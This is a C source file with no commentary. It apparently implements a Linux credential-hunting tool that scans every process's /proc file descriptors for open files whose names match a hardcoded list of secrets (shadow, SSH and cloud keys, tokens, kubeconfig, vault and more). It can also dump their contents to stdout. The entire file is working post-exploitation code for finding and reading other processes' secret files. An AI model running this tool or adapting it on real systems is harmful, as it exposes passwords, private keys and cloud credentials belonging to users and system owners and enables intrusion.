#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/stat.h>
#include <dirent.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>

static const char *interesting[] = {
    "shadow", "passwd", ".ssh", "id_rsa", "id_ed25519",
    ".aws", "credentials", ".gnupg", "private", "secret",
    "token", "password", "cert", ".bash_history",
    "kubeconfig", ".kube", "consul", "vault",
    NULL
};

static int is_interesting(const char *path)
{
    for (int i = 0; interesting[i]; i++)
        if (strstr(path, interesting[i])) return 1;
    return 0;
}

static void dump_fd(const char *proc_fd_path, const char *target_path)
{
    int fd = open(proc_fd_path, O_RDONLY);
    if (fd < 0) { fprintf(stderr, "  [!] open %s: %s\n", proc_fd_path, strerror(errno)); return; }

    printf("  --- %s ---\n", target_path);
    char buf[4096];
    ssize_t n;
    while ((n = read(fd, buf, sizeof(buf))) > 0)
        fwrite(buf, 1, (size_t)n, stdout);
    close(fd);
    printf("\n");
}

static void scan_pid(pid_t pid, const char *filter, int do_dump)
{
    char fd_dir[64];
    snprintf(fd_dir, sizeof(fd_dir), "/proc/%d/fd", (int)pid);

    DIR *d = opendir(fd_dir);
    if (!d) return;

    struct dirent *ent;
    while ((ent = readdir(d)) != NULL) {
        if (ent->d_name[0] == '.') continue;

        char fd_path[512], link_target[512];
        snprintf(fd_path, sizeof(fd_path), "%s/%s", fd_dir, ent->d_name);

        ssize_t n = readlink(fd_path, link_target, sizeof(link_target)-1);
        if (n < 0) continue;
        link_target[n] = '\0';

        if (filter && !strstr(link_target, filter)) continue;
        if (!filter && !is_interesting(link_target)) continue;

        printf("[pid=%d fd=%s] %s\n", (int)pid, ent->d_name, link_target);
        if (do_dump) dump_fd(fd_path, link_target);
    }
    closedir(d);
}

static void scan_all(const char *filter, int do_dump)
{
    DIR *d = opendir("/proc");
    if (!d) { perror("/proc"); return; }

    struct dirent *ent;
    while ((ent = readdir(d)) != NULL) {
        if (ent->d_type != DT_DIR && ent->d_type != DT_UNKNOWN) continue;
        char *end;
        pid_t pid = (pid_t)strtol(ent->d_name, &end, 10);
        if (*end != '\0' || pid <= 0) continue;
        scan_pid(pid, filter, do_dump);
    }
    closedir(d);
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        fprintf(stderr, "usage: %s <scan|pid|dump>\n", argv[0]);
        return 1;
    }

    if (strcmp(argv[1], "scan") == 0) {
        const char *filter = NULL;
        if (argc >= 4 && strcmp(argv[2], "--filter") == 0) filter = argv[3];
        scan_all(filter, 0);
        return 0;
    }

    if (strcmp(argv[1], "pid") == 0 && argc >= 3) {
        pid_t pid = (pid_t)atoi(argv[2]);
        const char *filter = NULL;
        if (argc >= 5 && strcmp(argv[3], "--filter") == 0) filter = argv[4];
        scan_pid(pid, filter, 0);
        return 0;
    }

    if (strcmp(argv[1], "dump") == 0 && argc >= 4) {
        pid_t pid = (pid_t)atoi(argv[2]);
        const char *fdnum = argv[3];
        char fd_path[128];
        snprintf(fd_path, sizeof(fd_path), "/proc/%d/fd/%s", (int)pid, fdnum);
        char link[512];
        ssize_t n = readlink(fd_path, link, sizeof(link)-1);
        if (n >= 0) { link[n] = '\0'; printf("[*] %s -> %s\n", fd_path, link); }
        dump_fd(fd_path, fd_path);
        return 0;
    }

    fprintf(stderr, "unknown: %s\n", argv[1]);
    return 1;
}
